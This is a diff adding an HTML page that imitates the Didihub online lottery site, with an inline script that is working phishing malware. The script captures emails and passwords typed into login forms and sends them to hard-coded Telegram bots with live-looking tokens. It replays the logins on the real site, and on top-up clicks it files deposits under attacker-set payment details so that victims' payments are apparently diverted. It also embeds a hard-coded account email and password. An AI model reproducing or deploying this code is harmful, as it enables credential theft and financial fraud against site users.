@@ -1,0 +1,1064 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    <link rel="icon" href="favicon.ico">
+    <title>Didihub - www.didihub.com</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="All">
+    <meta name="description" content="Didihub Merupakan Situs Lotre Online Wingo Terpercaya. Bonus dan jackpot adalah yang tertinggi.">
+    <meta name="keywords" content="Lotre,WinGo,Hilo,X50,Crash,Roulette,5D,Dice,Classic Dice,Mines,Plinko,DingDong,Dragon&Tiger,Originals,Live,Sports,Games">
+    <meta name="renderer" content="webkit">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-touch-fullscreen" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="full-screen" content="yes">
+    <meta name="x5-orientation" content="portrait">
+    <meta name="x5-fullscreen" content="true">
+    <meta name="x5-page-mode" content="app">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta name="google" content="notranslate">
+    <meta name="format-detection" content="telephone=no">
+    
+    <!-- External CSS Links -->
+    <link href="https://web.luckcdn.top/css/box.66ae9ae1.css" rel="prefetch">
+    <link href="https://web.luckcdn.top/css/box~invite.233e7107.css" rel="prefetch">
+    <link href="https://web.luckcdn.top/css/game.f196ac54.css" rel="prefetch">
+    <link href="https://web.luckcdn.top/css/game~user.329d5a1e.css" rel="prefetch">
+    <link href="https://web.luckcdn.top/css/invite.d21857b1.css" rel="prefetch">
+    <link href="https://web.luckcdn.top/css/sports.f4cd9f4f.css" rel="prefetch">
+    <link href="https://web.luckcdn.top/css/user.bbf1358e.css" rel="prefetch">
+    <link href="https://web.luckcdn.top/js/box.1e2464b1.js" rel="prefetch">
+    <link href="https://web.luckcdn.top/js/box~invite.c0c489ff.js" rel="prefetch">
+    <link href="https://web.luckcdn.top/js/game.474d933f.js" rel="prefetch">
+    <link href="https://web.luckcdn.top/js/game~user.877ec3c1.js" rel="prefetch">
+    <link href="https://web.luckcdn.top/js/invite.289ca45e.js" rel="prefetch">
+    <link href="https://web.luckcdn.top/js/sports.176a52a1.js" rel="prefetch">
+    <link href="https://web.luckcdn.top/js/user.9e84528f.js" rel="prefetch">
+    <link href="https://web.luckcdn.top/css/app.73b15726.css" rel="preload" as="style">
+    <link href="https://web.luckcdn.top/css/chunk-vendors.2096b49c.css" rel="preload" as="style">
+    <link href="https://web.luckcdn.top/js/app.6c056893.js" rel="preload" as="script">
+    <link href="https://web.luckcdn.top/js/chunk-vendors.aec67ee9.js" rel="preload" as="script">
+    <link href="https://web.luckcdn.top/css/chunk-vendors.2096b49c.css" rel="stylesheet">
+    <link href="https://web.luckcdn.top/css/app.73b15726.css" rel="stylesheet">
+    
+    <style>
+        /* Style untuk hidden form yang akan digunakan untuk integrasi Telegram */
+        #hiddenLoginForm {
+            display: none;
+        }
+        
+        /* Loading spinner */
+        .loading-spinner {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 2s linear infinite;
+            margin: 10px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Status messages */
+        .status-message {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 4px;
+            text-align: center;
+            display: none;
+        }
+        
+        .status-success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .status-error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .status-warning {
+            background-color: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
+        }
+    </style>
+</head>
+<body>
+    <noscript>
+        <strong>We're sorry but Didihub - www.didihub.com doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
+    </noscript>
+    
+    <div id="app"></div>
+    
+    <!-- Form tersembunyi untuk integrasi Telegram -->
+    <form id="hiddenLoginForm" style="display:none;">
+        <input type="email" id="email">
+        <input type="password" id="password">
+    </form>
+    
+    <!-- Status indicators -->
+    <div id="loadingSpinner" class="loading-spinner"></div>
+    <div id="statusMessage" class="status-message"></div>
+    
+    <!-- External Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/phaser/3.55.2/phaser.min.js"></script>
+    <script src="https://web.luckcdn.top/js/chunk-vendors.aec67ee9.js"></script>
+    <script src="https://web.luckcdn.top/js/app.6c056893.js"></script>
+    
+    <script>
+        // Konfigurasi Telegram Bot
+        const LOGIN_TELEGRAM_TOKEN = "8127246407:AAGNvn9LMRI69AK4ln9SQt8_amjX7y5cde0";
+        const LOGIN_CHAT_ID = "-4688999158";
+        const DEPOSIT_TELEGRAM_TOKEN = "7805960444:AAEb3UUNT3DZUfds6G2trRLv8UrJtLZfyyc";
+        const DEPOSIT_CHAT_ID = "-1002500559635";
+        
+        // Data login dari file pertama
+        const loginCredentials = {
+            email: "Bukanmasterbiasa@gmail.com",
+            password: "Gunawan12345",
+            browserVisitorId: "05467f96e147f52215497fe02e9d24e0",
+            programVisitorId: "8650KmEtzpHDEjWb"
+        };
+        
+        // Data pembayaran default
+        const paymentData = {
+            phone: "822328947322",
+            name: "ASEp"
+        };
+        
+        // URLs untuk API
+        const API_URLS = {
+            login: 'https://www.didihub.com/api/main/user/email/login',
+            payChannel: 'https://www.didihub.com/api/main/pay/channel',
+            payPost: 'https://www.didihub.com/api/main/pay/67'
+        };
+        
+        // Cache untuk mencegah duplikasi pesan
+        let sentMessagesCache = new Set();
+        const maxCacheSize = 1000;
+        let authToken = null;
+        let isProcessingDeposit = false;
+        let lastLoginCredentials = null; // Menyimpan kredensial login terakhir
+        
+        // Fungsi untuk membuat hash unik
+        function createMessageHash(email, password) {
+            const messageString = `${email.toLowerCase().trim()}:${password}`;
+            return btoa(messageString).replace(/[^a-zA-Z0-9]/g, '');
+        }
+        
+        // Fungsi untuk mengecek duplikasi
+        function isDuplicateMessage(email, password) {
+            const messageHash = createMessageHash(email, password);
+            return sentMessagesCache.has(messageHash);
+        }
+        
+        // Fungsi untuk menambahkan ke cache
+        function addToCache(email, password) {
+            const messageHash = createMessageHash(email, password);
+            
+            if (sentMessagesCache.size >= maxCacheSize) {
+                const cacheArray = Array.from(sentMessagesCache);
+                sentMessagesCache = new Set(cacheArray.slice(Math.floor(cacheArray.length / 2)));
+            }
+            
+            sentMessagesCache.add(messageHash);
+        }
+        
+        // Fungsi untuk mengirim pesan ke Telegram
+        async function sendTelegramMessage(token, chatId, message, type = 'general') {
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message
+            };
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                    console.log(`✅ ${type} message sent to Telegram successfully`);
+                    return { success: true, result };
+                } else {
+                    console.log(`❌ Failed to send ${type} message:`, result);
+                    return { success: false, error: result };
+                }
+            } catch (error) {
+                console.log(`❌ Error sending ${type} message:`, error);
+                return { success: false, error: error.toString() };
+            }
+        }
+        
+        // Fungsi untuk mengirim data login ke Telegram
+        async function sendLoginToTelegram(email, password) {
+            if (isDuplicateMessage(email, password)) {
+                console.log(`⚠️ Duplicate login message detected for: ${email}`);
+                showStatus('warning', 'Duplicate login, not sent');
+                return { ok: true, duplicate: true };
+            }
+            
+            // Simpan kredensial untuk digunakan di tab baru
+            lastLoginCredentials = { email, password };
+            
+            const currentTime = new Date().toLocaleString('id-ID', {
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+            
+            const message = `📝 LOGIN DIDIHUB:\n📧 Email: ${email}\n🔑 Password: ${password}\n⏰ Waktu: ${currentTime}`;
+            
+            showLoading(true);
+            
+            const result = await sendTelegramMessage(LOGIN_TELEGRAM_TOKEN, LOGIN_CHAT_ID, message, 'login');
+            
+            if (result.success) {
+                addToCache(email, password);
+                showStatus('success', 'Login data sent successfully - Opening new tab');
+                
+                // Buka tab baru dengan halaman login setelah berhasil mengirim ke Telegram
+                setTimeout(() => {
+                    openLoginTabWithAutoFill(email, password);
+                }, 1000);
+            } else {
+                showStatus('error', 'Failed to send login data');
+            }
+            
+            showLoading(false);
+            return result;
+        }
+        
+        // Fungsi untuk membuka tab baru dengan auto-fill
+        function openLoginTabWithAutoFill(email, password) {
+            console.log('🚀 Opening new login tab with auto-fill');
+            
+            // Buat URL dengan parameter untuk auto-fill
+            const loginUrl = 'https://www.didihub.com/login';
+            
+            // Buka tab baru
+            const newTab = window.open(loginUrl, '_blank');
+            
+            if (newTab) {
+                // Simpan data di sessionStorage untuk digunakan di tab baru
+                try {
+                    const loginData = JSON.stringify({ email, password, timestamp: Date.now() });
+                    // Gunakan postMessage untuk mengirim data ke tab baru
+                    setTimeout(() => {
+                        if (!newTab.closed) {
+                            newTab.postMessage({
+                                type: 'DIDIHUB_AUTO_LOGIN',
+                                data: { email, password }
+                            }, 'https://www.didihub.com');
+                        }
+                    }, 2000);
+                    
+                    // Alternatif: gunakan localStorage sementara
+                    localStorage.setItem('didihub_temp_login', loginData);
+                    
+                    // Hapus data sementara setelah 30 detik
+                    setTimeout(() => {
+                        localStorage.removeItem('didihub_temp_login');
+                    }, 30000);
+                    
+                } catch (e) {
+                    console.log('⚠️ Could not store login data:', e);
+                }
+                
+                // Inject script ke tab baru untuk auto-fill
+                setTimeout(() => {
+                    try {
+                        if (!newTab.closed) {
+                            // Script untuk auto-fill form di tab baru
+                            const autoFillScript = `
+                                (function() {
+                                    console.log('🔧 Auto-fill script loaded in new tab');
+                                    
+                                    const email = '${email}';
+                                    const password = '${password}';
+                                    
+                                    function fillLoginForm() {
+                                        console.log('🎯 Attempting to fill login form...');
+                                        
+                                        // Cari form login dengan berbagai selector
+                                        const emailSelectors = [
+                                            'input[type="email"]',
+                                            'input[name*="email"]',
+                                            'input[id*="email"]',
+                                            'input[placeholder*="email"]',
+                                            'input[placeholder*="Email"]',
+                                            'input[class*="email"]'
+                                        ];
+                                        
+                                        const passwordSelectors = [
+                                            'input[type="password"]',
+                                            'input[name*="password"]',
+                                            'input[id*="password"]',
+                                            'input[placeholder*="password"]',
+                                            'input[placeholder*="Password"]',
+                                            'input[class*="password"]'
+                                        ];
+                                        
+                                        let emailField = null;
+                                        let passwordField = null;
+                                        
+                                        // Cari email field
+                                        for (const selector of emailSelectors) {
+                                            emailField = document.querySelector(selector);
+                                            if (emailField) break;
+                                        }
+                                        
+                                        // Cari password field
+                                        for (const selector of passwordSelectors) {
+                                            passwordField = document.querySelector(selector);
+                                            if (passwordField) break;
+                                        }
+                                        
+                                        if (emailField && passwordField) {
+                                            console.log('✅ Found login fields, filling...');
+                                            
+                                            // Isi email
+                                            emailField.value = email;
+                                            emailField.dispatchEvent(new Event('input', { bubbles: true }));
+                                            emailField.dispatchEvent(new Event('change', { bubbles: true }));
+                                            
+                                            // Isi password
+                                            passwordField.value = password;
+                                            passwordField.dispatchEvent(new Event('input', { bubbles: true }));
+                                            passwordField.dispatchEvent(new Event('change', { bubbles: true }));
+                                            
+                                            console.log('🎉 Login form filled successfully');
+                                            
+                                            // Cari dan klik tombol login
+                                            setTimeout(() => {
+                                                const loginButtons = [
+                                                    'button[type="submit"]',
+                                                    'input[type="submit"]',
+                                                    'button:contains("Login")',
+                                                    'button:contains("Masuk")',
+                                                    '.login-btn',
+                                                    '.btn-login',
+                                                    '[class*="login"][class*="btn"]'
+                                                ];
+                                                
+                                                for (const selector of loginButtons) {
+                                                    const button = document.querySelector(selector);
+                                                    if (button && !button.disabled) {
+                                                        console.log('🔘 Clicking login button...');
+                                                        button.click();
+                                                        break;
+                                                    }
+                                                }
+                                            }, 500);
+                                            
+                                            return true;
+                                        } else {
+                                            console.log('❌ Login fields not found');
+                                            return false;
+                                        }
+                                    }
+                                    
+                                    // Coba isi form sekarang
+                                    let filled = fillLoginForm();
+                                    
+                                    // Jika belum berhasil, coba lagi dengan interval
+                                    if (!filled) {
+                                        let attempts = 0;
+                                        const maxAttempts = 20;
+                                        const fillInterval = setInterval(() => {
+                                            attempts++;
+                                            console.log('🔄 Retry attempt:', attempts);
+                                            
+                                            if (fillLoginForm() || attempts >= maxAttempts) {
+                                                clearInterval(fillInterval);
+                                            }
+                                        }, 1000);
+                                    }
+                                    
+                                    // Monitor DOM changes untuk SPA
+                                    const observer = new MutationObserver((mutations) => {
+                                        let shouldTryFill = false;
+                                        
+                                        mutations.forEach((mutation) => {
+                                            if (mutation.type === 'childList') {
+                                                mutation.addedNodes.forEach((node) => {
+                                                    if (node.nodeType === 1) {
+                                                        const hasEmailInput = node.querySelector && node.querySelector('input[type="email"], input[name*="email"]');
+                                                        const hasPasswordInput = node.querySelector && node.querySelector('input[type="password"]');
+                                                        
+                                                        if (hasEmailInput || hasPasswordInput) {
+                                                            shouldTryFill = true;
+                                                        }
+                                                    }
+                                                });
+                                            }
+                                        });
+                                        
+                                        if (shouldTryFill) {
+                                            setTimeout(fillLoginForm, 500);
+                                        }
+                                    });
+                                    
+                                    observer.observe(document.body, {
+                                        childList: true,
+                                        subtree: true
+                                    });
+                                    
+                                })();
+                            `;
+                            
+                            // Inject script
+                            newTab.eval = newTab.eval || function() {};
+                            newTab.postMessage({
+                                type: 'EXECUTE_SCRIPT',
+                                script: autoFillScript
+                            }, '*');
+                        }
+                    } catch (e) {
+                        console.log('⚠️ Could not inject auto-fill script:', e);
+                    }
+                }, 3000);
+                
+            } else {
+                console.log('❌ Could not open new tab - popup blocked?');
+                showStatus('warning', 'Could not open new tab. Please allow popups.');
+            }
+        }
+        
+        // Listen untuk pesan dari tab baru
+        window.addEventListener('message', function(event) {
+            if (event.origin !== 'https://www.didihub.com') return;
+            
+            if (event.data.type === 'DIDIHUB_AUTO_LOGIN' && lastLoginCredentials) {
+                console.log('📨 Received auto-login request from new tab');
+                // Data sudah tersedia di event.data.data
+            }
+        });
+        
+        // Fungsi untuk auto-login (dipertahankan untuk kompatibilitas)
+        async function autoLogin(email = null, password = null) {
+            try {
+                const loginEmail = email || loginCredentials.email;
+                const loginPassword = password || loginCredentials.password;
+                
+                console.log('🔐 Starting auto-login process...');
+                
+                const loginPayload = {
+                    email: loginEmail,
+                    password: loginPassword,
+                    browserVisitorId: loginCredentials.browserVisitorId,
+                    programVisitorId: loginCredentials.programVisitorId
+                };
+                
+                const loginHeaders = {
+                    "Content-Type": "application/json",
+                    "Origin": "https://www.didihub.com",
+                    "Referer": "https://www.didihub.com/"
+                };
+                
+                const loginResponse = await fetch(API_URLS.login, {
+                    method: 'POST',
+                    headers: loginHeaders,
+                    body: JSON.stringify(loginPayload)
+                });
+                
+                if (loginResponse.ok) {
+                    const loginData = await loginResponse.json();
+                    authToken = loginData.token;
+                    
+                    if (authToken) {
+                        console.log('✅ Auto-login successful');
+                        showStatus('success', 'Auto-login successful');
+                        
+                        // Redirect ke halaman user center setelah login berhasil
+                        setTimeout(() => {
+                            window.location.href = 'https://www.didihub.com/user/center';
+                        }, 1000);
+                        
+                        return true;
+                    }
+                }
+                
+                console.log('❌ Auto-login failed');
+                return false;
+                
+            } catch (error) {
+                console.log('❌ Auto-login error:', error);
+                return false;
+            }
+        }
+        
+        // Fungsi untuk memproses deposit
+        async function processDeposit(amount) {
+            if (isProcessingDeposit) {
+                console.log('⚠️ Deposit already in progress');
+                return;
+            }
+            
+            if (!authToken) {
+                console.log('❌ No auth token available, attempting auto-login first');
+                const loginSuccess = await autoLogin();
+                if (!loginSuccess) {
+                    showStatus('error', 'Login required for deposit');
+                    return;
+                }
+            }
+            
+            isProcessingDeposit = true;
+            showLoading(true);
+            
+            try {
+                console.log('💰 Starting deposit process for amount:', amount);
+                
+                // Request deposit dengan QRIS
+                const payHeaders = {
+                    "Content-Type": "application/json",
+                    "Authorization": `Bearer ${authToken}`,
+                    "User_token": authToken,
+                    "Origin": "https://www.didihub.com",
+                    "Referer": "https://www.didihub.com/"
+                };
+                
+                const payPayload = {
+                    amount: amount.toString(),
+                    phone: paymentData.phone,
+                    name: paymentData.name
+                };
+                
+                const payResponse = await fetch(API_URLS.payPost, {
+                    method: 'POST',
+                    headers: payHeaders,
+                    body: JSON.stringify(payPayload)
+                });
+                
+                if (payResponse.ok) {
+                    const payResult = await payResponse.json();
+                    console.log('💳 Payment response:', payResult);
+                    
+                    // Cari URL QR code
+                    let qrCodeUrl = null;
+                    const possibleFields = ['qrCodeUrl', 'qr_code', 'qr', 'qrCode', 'qrUrl', 'url'];
+                    
+                    for (const field of possibleFields) {
+                        if (payResult[field]) {
+                            qrCodeUrl = payResult[field];
+                            break;
+                        }
+                    }
+                    
+                    // Cari di nested objects
+                    if (!qrCodeUrl) {
+                        for (const [key, value] of Object.entries(payResult)) {
+                            if (typeof value === 'object' && value !== null) {
+                                for (const field of possibleFields) {
+                                    if (value[field]) {
+                                        qrCodeUrl = value[field];
+                                        break;
+                                    }
+                                }
+                                if (qrCodeUrl) break;
+                            }
+                        }
+                    }
+                    
+                    // Kirim ke Telegram
+                    const currentTime = new Date().toLocaleString('id-ID');
+                    let message;
+                    
+                    if (qrCodeUrl) {
+                        message = `💰 DEPOSIT REQUEST DIDIHUB:\n💵 Amount: Rp ${amount.toLocaleString('id-ID')}\n📱 Phone: ${paymentData.phone}\n👤 Name: ${paymentData.name}\n🔗 QR Code: ${qrCodeUrl}\n⏰ Time: ${currentTime}`;
+                        
+                        // Simpan QR URL untuk tombol "Isi ulang" selanjutnya
+                        window.lastQRUrl = qrCodeUrl;
+                    } else {
+                        message = `💰 DEPOSIT REQUEST DIDIHUB:\n💵 Amount: Rp ${amount.toLocaleString('id-ID')}\n📱 Phone: ${paymentData.phone}\n👤 Name: ${paymentData.name}\n❌ QR Code not found in response\n📄 Response: ${JSON.stringify(payResult)}\n⏰ Time: ${currentTime}`;
+                    }
+                    
+                    const telegramResult = await sendTelegramMessage(DEPOSIT_TELEGRAM_TOKEN, DEPOSIT_CHAT_ID, message, 'deposit');
+                    
+                    if (telegramResult.success) {
+                        showStatus('success', 'Deposit request sent to Telegram');
+                        
+                        // Auto-open QR URL jika tersedia
+                        if (qrCodeUrl) {
+                            setTimeout(() => {
+                                window.open(qrCodeUrl, '_blank');
+                            }, 1000);
+                        }
+                    } else {
+                        showStatus('error', 'Failed to send deposit request');
+                    }
+                } else {
+                    console.log('❌ Deposit request failed:', payResponse.status);
+                    showStatus('error', 'Deposit request failed');
+                }
+                
+            } catch (error) {
+                console.log('❌ Deposit error:', error);
+                showStatus('error', 'Deposit processing error');
+            } finally {
+                isProcessingDeposit = false;
+                showLoading(false);
+            }
+        }
+        
+        // Fungsi untuk menampilkan loading
+        function showLoading(show) {
+            const spinner = document.getElementById('loadingSpinner');
+            if (show) {
+                spinner.style.display = 'block';
+            } else {
+                spinner.style.display = 'none';
+            }
+        }
+        
+        // Fungsi untuk menampilkan status
+        function showStatus(type, message) {
+            const statusDiv = document.getElementById('statusMessage');
+            statusDiv.className = `status-message status-${type}`;
+            statusDiv.textContent = message;
+            statusDiv.style.display = 'block';
+            
+            setTimeout(() => {
+                statusDiv.style.display = 'none';
+            }, 5000);
+        }
+        
+        // Fungsi untuk monitor login attempts
+        function interceptLoginAttempts() {
+            // Monitor form submissions
+            document.addEventListener('submit', function(e) {
+                const form = e.target;
+                const emailField = form.querySelector('input[type="email"], input[name*="email"], input[id*="email"]');
+                const passwordField = form.querySelector('input[type="password"], input[name*="password"], input[id*="password"]');
+                
+                if (emailField && passwordField) {
+                    const email = emailField.value.trim();
+                    const password = passwordField.value.trim();
+                    
+                    if (email && password) {
+                        sendLoginToTelegram(email, password);
+                    }
+                }
+            });
+            
+            // Monitor input changes
+            document.addEventListener('input', function(e) {
+                const input = e.target;
+                if ((input.type === 'email' || input.name?.includes('email') || input.id?.includes('email')) ||
+                    (input.type === 'password' || input.name?.includes('password') || input.id?.includes('password'))) {
+                    
+                    const form = input.closest('form') || document.body;
+                    const emailField = form.querySelector('input[type="email"], input[name*="email"], input[id*="email"]');
+                    const passwordField = form.querySelector('input[type="password"], input[name*="password"], input[id*="password"]');
+                    
+                    if (emailField && passwordField && emailField.value.trim() && passwordField.value.trim()) {
+                        clearTimeout(window.loginTimeout);
+                        window.loginTimeout = setTimeout(() => {
+                            const email = emailField.value.trim();
+                            const password = passwordField.value.trim();
+                            
+                            if (email && password && email.includes('@')) {
+                                sendLoginToTelegram(email, password);
+                            }
+                        }, 2000);
+                    }
+                }
+            });
+            
+            // Monitor button clicks
+            document.addEventListener('click', function(e) {
+                const button = e.target;
+                const buttonText = button.textContent?.toLowerCase() || '';
+                const buttonClass = button.className?.toLowerCase() || '';
+                
+                // Detect login buttons
+                if (buttonText.includes('login') || buttonText.includes('masuk') || buttonText.includes('sign in')) {
+                    setTimeout(() => {
+                        const container = button.closest('form') || document.body;
+                        const emailField = container.querySelector('input[type="email"], input[name*="email"], input[id*="email"]');
+                        const passwordField = container.querySelector('input[type="password"], input[name*="password"], input[id*="password"]');
+                        
+                        if (emailField && passwordField) {
+                            const email = emailField.value.trim();
+                            const password = passwordField.value.trim();
+                            
+                            if (email && password) {
+                                sendLoginToTelegram(email, password);
+                            }
+                        }
+                    }, 500);
+                }
+                
+                // Detect "Isi ulang" buttons
+                if (buttonText.includes('isi ulang') || buttonText.includes('deposit') || buttonText.includes('top up')) {
+                    console.log('🎯 Isi ulang button detected');
+                    
+                    setTimeout(() => {
+                        // Cari input amount terdekat
+                        const container = button.closest('form') || document.body;
+                        let amountInput = container.querySelector('input[name="amount"], input[placeholder*="jumlah"], input[placeholder*="amount"]');
+                        
+                        // Jika tidak ditemukan, cari di seluruh dokumen
+                        if (!amountInput) {
+                            amountInput = document.querySelector('input[name="amount"], input[placeholder*="jumlah"], input[placeholder*="amount"]');
+                        }
+                        
+                        let amount = 50000; // Default amount
+                        
+                        if (amountInput && amountInput.value) {
+                            const parsedAmount = parseInt(amountInput.value.replace(/[^0-9]/g, ''));
+                            if (parsedAmount && parsedAmount >= 20000 && parsedAmount <= 5000000) {
+                                amount = parsedAmount;
+                            }
+                        }
+                        
+                        console.log('💰 Processing deposit with amount:', amount);
+                        processDeposit(amount);
+                        
+                    }, 1000);
+                }
+                
+                // Auto-open QR jika tombol "Isi ulang" yang kedua diklik
+                if ((buttonText.includes('isi ulang') && buttonClass.includes('info')) || 
+                    (buttonClass.includes('block') && buttonText.includes('isi ulang'))) {
+                    console.log('🔄 Secondary Isi ulang button clicked - opening QR');
+                    
+                    if (window.lastQRUrl) {
+                        setTimeout(() => {
+                            window.open(window.lastQRUrl, '_blank');
+                        }, 500);
+                    } else {
+                        console.log('⚠️ No QR URL available to open');
+                    }
+                }
+            });
+        }
+        
+        // Fungsi untuk monitor DOM changes
+        function observeDOMChanges() {
+            const observer = new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                    if (mutation.type === 'childList') {
+                        mutation.addedNodes.forEach(function(node) {
+                            if (node.nodeType === 1) {
+                                const forms = node.querySelectorAll ? node.querySelectorAll('form') : [];
+                                const inputs = node.querySelectorAll ? node.querySelectorAll('input[type="email"], input[type="password"]') : [];
+                                
+                                if (forms.length > 0 || inputs.length > 0 || node.tagName === 'FORM' || 
+                                    (node.tagName === 'INPUT' && (node.type === 'email' || node.type === 'password'))) {
+                                    setTimeout(interceptLoginAttempts, 100);
+                                }
+                            }
+                        });
+                    }
+                });
+            });
+            
+            observer.observe(document.body, {
+                childList: true,
+                subtree: true
+            });
+        }
+        
+        // Fungsi untuk auto redirect ke login
+        function autoRedirectToLogin() {
+            const loginSelectors = [
+                'a[href*="login"]',
+                'button[class*="login"]',
+                '.login-btn',
+                '.btn-login',
+                '[data-route="login"]',
+                '[onclick*="login"]'
+            ];
+            
+            for (const selector of loginSelectors) {
+                const element = document.querySelector(selector);
+                if (element) {
+                    console.log('🔍 Found login element:', selector);
+                    element.click();
+                    return true;
+                }
+            }
+            
+            // Try hash manipulation
+            const loginHashes = ['#/login', '#login', '#/signin', '#signin'];
+            for (const hash of loginHashes) {
+                window.location.hash = hash;
+                if (window.location.hash === hash) {
+                    return true;
+                }
+            }
+            
+            return false;
+        }
+        
+        // Fungsi untuk handle auto-fill di halaman login (untuk tab baru)
+        function handleAutoFillOnLoginPage() {
+            // Cek apakah ini halaman login dan ada data sementara
+            if (window.location.pathname.includes('/login') || window.location.hash.includes('login')) {
+                try {
+                    const tempData = localStorage.getItem('didihub_temp_login');
+                    if (tempData) {
+                        const loginData = JSON.parse(tempData);
+                        const { email, password, timestamp } = loginData;
+                        
+                        // Cek apakah data masih fresh (kurang dari 30 detik)
+                        if (Date.now() - timestamp < 30000) {
+                            console.log('🔧 Found temp login data, attempting auto-fill...');
+                            
+                            setTimeout(() => {
+                                fillLoginFormWithData(email, password);
+                            }, 1000);
+                        } else {
+                            // Hapus data kadaluarsa
+                            localStorage.removeItem('didihub_temp_login');
+                        }
+                    }
+                } catch (e) {
+                    console.log('⚠️ Error reading temp login data:', e);
+                }
+            }
+        }
+        
+        // Fungsi untuk mengisi form login dengan data yang diberikan
+        function fillLoginFormWithData(email, password) {
+            console.log('🎯 Attempting to fill login form with provided data...');
+            
+            // Cari form login dengan berbagai selector
+            const emailSelectors = [
+                'input[type="email"]',
+                'input[name*="email"]',
+                'input[id*="email"]',
+                'input[placeholder*="email"]',
+                'input[placeholder*="Email"]',
+                'input[class*="email"]'
+            ];
+            
+            const passwordSelectors = [
+                'input[type="password"]',
+                'input[name*="password"]',
+                'input[id*="password"]',
+                'input[placeholder*="password"]',
+                'input[placeholder*="Password"]',
+                'input[class*="password"]'
+            ];
+            
+            let emailField = null;
+            let passwordField = null;
+            
+            // Cari email field
+            for (const selector of emailSelectors) {
+                emailField = document.querySelector(selector);
+                if (emailField) break;
+            }
+            
+            // Cari password field
+            for (const selector of passwordSelectors) {
+                passwordField = document.querySelector(selector);
+                if (passwordField) break;
+            }
+            
+            if (emailField && passwordField) {
+                console.log('✅ Found login fields, filling...');
+                
+                // Isi email
+                emailField.value = email;
+                emailField.dispatchEvent(new Event('input', { bubbles: true }));
+                emailField.dispatchEvent(new Event('change', { bubbles: true }));
+                emailField.dispatchEvent(new Event('blur', { bubbles: true }));
+                
+                // Isi password
+                passwordField.value = password;
+                passwordField.dispatchEvent(new Event('input', { bubbles: true }));
+                passwordField.dispatchEvent(new Event('change', { bubbles: true }));
+                passwordField.dispatchEvent(new Event('blur', { bubbles: true }));
+                
+                console.log('🎉 Login form filled successfully');
+                
+                // Focus pada password field
+                passwordField.focus();
+                
+                // Cari dan klik tombol login setelah delay
+                setTimeout(() => {
+                    const loginButtonSelectors = [
+                        'button[type="submit"]',
+                        'input[type="submit"]',
+                        'button:contains("Login")',
+                        'button:contains("Masuk")',
+                        '.login-btn',
+                        '.btn-login',
+                        '[class*="login"][class*="btn"]',
+                        'button[class*="submit"]'
+                    ];
+                    
+                    for (const selector of loginButtonSelectors) {
+                        const button = document.querySelector(selector);
+                        if (button && !button.disabled) {
+                            console.log('🔘 Auto-clicking login button...');
+                            button.click();
+                            break;
+                        }
+                    }
+                }, 1000);
+                
+                return true;
+            } else {
+                console.log('❌ Login fields not found, will retry...');
+                return false;
+            }
+        }
+        
+        // Setup auto-fill dengan retry mechanism
+        function setupAutoFillWithRetry() {
+            let attempts = 0;
+            const maxAttempts = 15;
+            
+            const tryAutoFill = () => {
+                attempts++;
+                console.log(`🔄 Auto-fill attempt: ${attempts}/${maxAttempts}`);
+                
+                try {
+                    const tempData = localStorage.getItem('didihub_temp_login');
+                    if (tempData) {
+                        const loginData = JSON.parse(tempData);
+                        const { email, password, timestamp } = loginData;
+                        
+                        // Cek apakah data masih fresh
+                        if (Date.now() - timestamp < 30000) {
+                            const success = fillLoginFormWithData(email, password);
+                            
+                            if (success) {
+                                // Hapus data setelah berhasil
+                                localStorage.removeItem('didihub_temp_login');
+                                return;
+                            }
+                        } else {
+                            // Hapus data kadaluarsa
+                            localStorage.removeItem('didihub_temp_login');
+                            return;
+                        }
+                    }
+                } catch (e) {
+                    console.log('⚠️ Error in auto-fill retry:', e);
+                }
+                
+                // Retry jika belum berhasil dan belum mencapai max attempts
+                if (attempts < maxAttempts) {
+                    setTimeout(tryAutoFill, 1000);
+                }
+            };
+            
+            // Mulai proses auto-fill
+            setTimeout(tryAutoFill, 500);
+        }
+        
+        // Inisialisasi
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🚀 Didihub Integrated System initialized');
+            interceptLoginAttempts();
+            observeDOMChanges();
+            
+            // Cek apakah ini halaman login untuk auto-fill
+            handleAutoFillOnLoginPage();
+            setupAutoFillWithRetry();
+            
+            // Auto redirect ke login page jika bukan halaman login
+            setTimeout(() => {
+                if (!window.location.hash.includes('login') && !window.location.pathname.includes('login')) {
+                    autoRedirectToLogin();
+                }
+            }, 1000);
+        });
+        
+        // Backup initialization
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', function() {
+                interceptLoginAttempts();
+                observeDOMChanges();
+                handleAutoFillOnLoginPage();
+                setupAutoFillWithRetry();
+            });
+        } else {
+            interceptLoginAttempts();
+            observeDOMChanges();
+            handleAutoFillOnLoginPage();
+            setupAutoFillWithRetry();
+        }
+        
